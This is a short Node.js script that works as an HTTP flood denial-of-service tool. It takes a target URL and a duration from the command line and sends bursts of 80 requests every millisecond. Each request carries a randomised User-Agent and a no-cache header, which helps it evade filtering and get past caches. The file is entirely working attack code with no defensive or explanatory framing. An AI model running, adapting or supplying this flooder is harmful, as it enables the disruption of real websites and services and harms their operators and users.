const request = require('request');
const UserAgent = require('user-agents');
const target = process.argv[2], duration = process.argv[3];
const start = Date.now();

function attack() {
    if (Date.now() - start > duration * 1000) process.exit();
    const options = {
        url: target,
        headers: {
            'User-Agent': new UserAgent().toString(),
            'Cache-Control': 'no-cache'
        }
    };
    for (let i = 0; i < 80; i++) { request(options); }
    setTimeout(attack, 1);
}
attack();

